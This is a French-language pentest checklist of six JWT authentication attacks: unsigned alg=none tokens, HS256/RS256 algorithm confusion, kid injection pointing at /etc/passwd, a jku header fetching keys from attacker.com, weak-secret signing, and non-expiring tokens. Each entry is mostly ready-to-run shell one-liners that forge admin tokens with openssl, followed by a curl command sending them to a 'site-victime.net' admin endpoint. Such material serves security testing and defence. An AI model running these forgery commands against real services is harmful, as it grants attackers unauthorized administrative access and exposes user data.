# JWT

1. Faible vérification de signature ou acceptation de l’algorithme "none"  
   - Payload d’attaque neutre : Générer un JWT non signé avec echo -n '{"alg":"none","typ":"JWT"}' | openssl base64 -A | tr '+/' '-_' | tr -d '=' > h.txt ; echo -n '{"sub":123,"admin":true}' | openssl base64 -A | tr '+/' '-_' | tr -d '=' > p.txt ; export JWT="$(cat h.txt).$(cat p.txt)."  
   - Commande d’attaque : curl -H "Authorization: Bearer $JWT" https://site-victime.net/api/admin  
   - Commande d’analyse : Observer si l’accès à une ressource protégée est accordé malgré l’absence de signature (ex : code HTTP 200 ou accès admin).  
   - Élément d’analyse détaillé : Vérifier si l’application accepte des tokens JWT non signés ou avec alg=none, permettant la création de tokens arbitraires.  
   - Méthodologie détaillée : Générer un JWT avec alg=none, l’injecter dans une requête authentifiée, et observer si l’accès est accordé sans validation cryptographique.  
   - Source : https://www.invicti.com/blog/web-security/json-web-token-jwt-attacks-vulnerabilities/

2. Confusion d’algorithme (HS256 vs RS256)  
   - Payload d’attaque neutre : Générer un JWT HS256 signé avec la clé publique du serveur : export HEADER=$(echo -n '{"alg":"HS256","typ":"JWT"}' | openssl base64 -A | tr '+/' '-_' | tr -d '=') ; export PAYLOAD=$(echo -n '{"sub":123,"admin":true}' | openssl base64 -A | tr '+/' '-_' | tr -d '=') ; export DATA="$HEADER.$PAYLOAD" ; export SECRET="clé_publique_serveur" ; export SIGNATURE=$(echo -n $DATA | openssl dgst -sha256 -hmac "$SECRET" -binary | openssl base64 -A | tr '+/' '-_' | tr -d '=') ; export JWT="$DATA.$SIGNATURE"  
   - Commande d’attaque : curl -H "Authorization: Bearer $JWT" https://site-victime.net/api/admin  
   - Commande d’analyse : Vérifier si l’accès à une ressource protégée est accordé alors que la clé de signature utilisée est publique et non secrète.  
   - Élément d’analyse détaillé : Vérifier si l’application ne distingue pas correctement les algorithmes de signature, permettant de signer un token HS256 avec une clé publique.  
   - Méthodologie détaillée : Récupérer la clé publique du serveur (pour RS256), générer un JWT en HS256 signé avec cette clé, et tester l’accès à des endpoints protégés.  
   - Source : https://www.synetis.com/json-web-token-oauth-vulnerabilite-critique/

3. Injection ou manipulation du paramètre kid (Key ID)  
   - Payload d’attaque neutre : Générer un JWT avec kid malicieux : export HEADER=$(echo -n '{"alg":"HS256","typ":"JWT","kid":"key1|/etc/passwd"}' | openssl base64 -A | tr '+/' '-_' | tr -d '=') ; export PAYLOAD=$(echo -n '{"sub":123,"admin":true}' | openssl base64 -A | tr '+/' '-_' | tr -d '=') ; export DATA="$HEADER.$PAYLOAD" ; export SECRET="clé_connue" ; export SIGNATURE=$(echo -n $DATA | openssl dgst -sha256 -hmac "$SECRET" -binary | openssl base64 -A | tr '+/' '-_' | tr -d '=') ; export JWT="$DATA.$SIGNATURE"  
   - Commande d’attaque : curl -H "Authorization: Bearer $JWT" https://site-victime.net/api/admin  
   - Commande d’analyse : Observer si l’application utilise la valeur du champ kid pour charger une clé arbitraire ou exécuter une commande, ou si une erreur système apparaît dans la réponse.  
   - Élément d’analyse détaillé : Vérifier si l’application est vulnérable à l’injection dans le paramètre kid, permettant de détourner la récupération de la clé de vérification ou de provoquer une LFI.  
   - Méthodologie détaillée : Générer un JWT avec un champ kid malicieux, le signer, l’envoyer, et observer la réaction de l’application.  
   - Source : https://www.acunetix.com/blog/articles/json-web-token-jwt-attacks-vulnerabilities/

4. Contrôle externe de la clé via jku ou x5u  
   - Payload d’attaque neutre : Générer un JWT RS256 avec un header {"jku":"https://attacker.com/jwks.json"} et signer avec une clé privée correspondante à la clé publique du fichier jwks.json hébergé sur attacker.com (exemple avec jose-jwt : jose jwt sign --key private.pem --alg RS256 --header '{"jku":"https://attacker.com/jwks.json"}' --payload '{"sub":123,"admin":true}' > jwt.txt)  
   - Commande d’attaque : curl -H "Authorization: Bearer $(cat jwt.txt)" https://site-victime.net/api/admin  
   - Commande d’analyse : Vérifier si l’application récupère la clé publique depuis l’URL fournie dans jku/x5u et accepte le token signé par l’attaquant.  
   - Élément d’analyse détaillé : Vérifier si l’application accepte des URLs externes pour récupérer la clé de vérification, permettant à un attaquant de signer des tokens valides reconnus par le serveur.  
   - Méthodologie détaillée : Générer un JWT avec un champ jku/x5u pointant vers une clé publique contrôlée, le signer avec la clé privée correspondante, l’envoyer, et observer si le serveur accepte le token.  
   - Source : https://www.acunetix.com/blog/articles/json-web-token-jwt-attacks-vulnerabilities/

5. Réutilisation ou vol de clé secrète / signature faible  
   - Payload d’attaque neutre : Générer un JWT HS256 signé avec une clé faible ou prédictible (ex : "secret") : export HEADER=$(echo -n '{"alg":"HS256","typ":"JWT"}' | openssl base64 -A | tr '+/' '-_' | tr -d '=') ; export PAYLOAD=$(echo -n '{"sub":123,"admin":true}' | openssl base64 -A | tr '+/' '-_' | tr -d '=') ; export DATA="$HEADER.$PAYLOAD" ; export SECRET="secret" ; export SIGNATURE=$(echo -n $DATA | openssl dgst -sha256 -hmac "$SECRET" -binary | openssl base64 -A | tr '+/' '-_' | tr -d '=') ; export JWT="$DATA.$SIGNATURE"  
   - Commande d’attaque : curl -H "Authorization: Bearer $JWT" https://site-victime.net/api/admin  
   - Commande d’analyse : Vérifier si l’accès à la ressource est accordé avec un token signé par une clé faible ou connue, ou si la clé peut être brute-forcée.  
   - Élément d’analyse détaillé : Vérifier si la clé secrète utilisée pour signer les JWT est faible, prédictible ou exposée, permettant à un attaquant de forger des tokens valides.  
   - Méthodologie détaillée : Générer des tokens avec des clés faibles ou connues, les tester, ou utiliser des outils de brute-force sur la clé secrète.  
   - Source : https://guide-api-rest.marmicode.fr/securite-des-apis-rest/j.w.t./jwt-authentification-sessions-et-risques-securite

6. Mauvaise gestion de l’expiration ou absence de révocation  
   - Payload d’attaque neutre : Générer un JWT avec un champ "exp" très éloigné dans le temps ou sans champ "exp" du tout, par exemple export HEADER=$(echo -n '{"alg":"HS256","typ":"JWT"}' | openssl base64 -A | tr '+/' '-_' | tr -d '=') ; export PAYLOAD=$(echo -n '{"sub":123,"exp":9999999999}' | openssl base64 -A | tr '+/' '-_' | tr -d '=') ; export DATA="$HEADER.$PAYLOAD" ; export SECRET="secret" ; export SIGNATURE=$(echo -n $DATA | openssl dgst -sha256 -hmac "$SECRET" -binary | openssl base64 -A | tr '+/' '-_' | tr -d '=') ; export JWT="$DATA.$SIGNATURE"  
   - Commande d’attaque : curl -H "Authorization: Bearer $JWT" https://site-victime.net/api/admin  
   - Commande d’analyse : Observer si l’accès est toujours accordé bien après la déconnexion ou la révocation supposée de la session, ou si le token reste valide indéfiniment.  
   - Élément d’analyse détaillé : Vérifier si l’application ne révoque pas les tokens côté serveur ou accepte des tokens JWT sans vérification stricte de l’expiration, permettant leur réutilisation indéfinie.  
   - Méthodologie détaillée : Générer des tokens avec une durée de vie très longue ou sans expiration, les utiliser après déconnexion ou expiration, et vérifier l’accès.  
   - Source : https://laconsole.dev/formations/authentification/jwt

---
